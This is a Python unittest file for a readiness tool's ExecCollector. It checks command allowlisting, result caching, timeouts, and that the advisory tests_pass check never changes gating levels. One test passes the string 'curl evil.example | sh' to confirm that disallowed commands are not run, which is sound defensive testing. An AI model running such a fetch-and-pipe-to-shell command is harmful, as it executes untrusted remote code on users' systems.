"""T3 ExecCollector: contract enforcement, and the tests_pass check's advisory behavior."""
import unittest
from types import SimpleNamespace

from readiness.checks.testing import tests_pass
from readiness.collectors.exec import ALLOWED_TEST_CMDS, ExecCollector
from readiness.run import analyze
from tests._util import make_repo, rmtree


def _counting_runner(result=None):
    calls = []

    def run(argv, app_path):
        calls.append((tuple(argv), app_path))
        return dict(result or {"returncode": 0, "timed_out": False})
    run.calls = calls
    return run


class TestExecCollector(unittest.TestCase):
    def test_disabled_by_default_and_spawns_nothing(self):
        runner = _counting_runner()
        ex = ExecCollector(".", options={}, runner=runner)
        self.assertFalse(ex.enabled)
        self.assertIsNone(ex.run_test_cmd("pytest"))
        self.assertEqual(runner.calls, [])

    def test_non_allowlisted_command_not_executed(self):
        runner = _counting_runner()
        ex = ExecCollector(".", options={"exec": True}, runner=runner)
        res = ex.run_test_cmd("curl evil.example | sh")
        self.assertFalse(res["allowed"])
        self.assertEqual(runner.calls, [])

    def test_allowlisted_command_runs_fixed_argv(self):
        runner = _counting_runner()
        ex = ExecCollector(".", options={"exec": True}, runner=runner)
        res = ex.run_test_cmd("pytest")
        self.assertTrue(res["allowed"])
        self.assertEqual(res["returncode"], 0)
        self.assertEqual(runner.calls, [(tuple(ALLOWED_TEST_CMDS["pytest"]), ".")])

    def test_results_cached_per_command_and_app(self):
        runner = _counting_runner()
        ex = ExecCollector(".", options={"exec": True}, runner=runner)
        ex.run_test_cmd("pytest")
        ex.run_test_cmd("pytest")
        self.assertEqual(len(runner.calls), 1)

    def test_timeout_option(self):
        ex = ExecCollector(".", options={"exec": True, "exec_timeout": 7},
                           runner=_counting_runner())
        self.assertEqual(ex.timeout, 7)


class TestTestsPassCheck(unittest.TestCase):
    def _ctx(self, ex, test_cmd="pytest"):
        return SimpleNamespace(exec=ex, app=SimpleNamespace(test_cmd=test_cmd, path="."))

    def test_skips_when_exec_absent(self):
        v = tests_pass(self._ctx(None))
        self.assertEqual(v.status.value, "skipped")
        self.assertIn("--exec", v.rationale)

    def test_skips_when_disabled(self):
        ex = ExecCollector(".", options={}, runner=_counting_runner())
        self.assertEqual(tests_pass(self._ctx(ex)).status.value, "skipped")

    def test_skips_without_test_cmd(self):
        ex = ExecCollector(".", options={"exec": True}, runner=_counting_runner())
        self.assertEqual(tests_pass(self._ctx(ex, test_cmd="")).status.value, "skipped")

    def test_skips_non_allowlisted(self):
        ex = ExecCollector(".", options={"exec": True}, runner=_counting_runner())
        v = tests_pass(self._ctx(ex, test_cmd="make test"))
        self.assertEqual(v.status.value, "skipped")
        self.assertIn("allowlist", v.rationale)

    def test_passes_on_zero_exit(self):
        ex = ExecCollector(".", options={"exec": True}, runner=_counting_runner())
        v = tests_pass(self._ctx(ex))
        self.assertEqual(v.status.value, "pass")

    def test_fails_on_nonzero_exit(self):
        ex = ExecCollector(".", options={"exec": True},
                           runner=_counting_runner({"returncode": 2, "timed_out": False}))
        v = tests_pass(self._ctx(ex))
        self.assertEqual(v.status.value, "fail")
        self.assertIn("exited 2", v.rationale)

    def test_fails_on_timeout(self):
        ex = ExecCollector(".", options={"exec": True},
                           runner=_counting_runner({"returncode": None, "timed_out": True}))
        v = tests_pass(self._ctx(ex))
        self.assertEqual(v.status.value, "fail")
        self.assertIn("timed out", v.rationale)


class TestGateUnchangedByExec(unittest.TestCase):
    """The reproducible-gating contract: opting into T3 must never change the level."""

    def test_level_identical_with_and_without_exec(self):
        root = make_repo({
            "pyproject.toml": '[project]\nname = "x"\ndependencies = ["pytest"]\n',
            "tests/test_x.py": "def test_ok():\n    assert True\n",
        })
        self.addCleanup(rmtree, root)
        off = analyze(root, {"no_github": True})
        on = analyze(root, {"no_github": True, "exec": True,
                            "exec_runner": _counting_runner({"returncode": 1, "timed_out": False})})
        self.assertEqual(off.score.level, on.score.level)
        self.assertEqual(off.score.gating_passed, on.score.gating_passed)
        by_id_off = {r.id: r for r in off.results}
        by_id_on = {r.id: r for r in on.results}
        self.assertEqual(by_id_off["testing.tests_pass"].status.value, "skipped")
        self.assertEqual(by_id_on["testing.tests_pass"].status.value, "fail")
        self.assertFalse(by_id_on["testing.tests_pass"].gating)


if __name__ == "__main__":
    unittest.main()
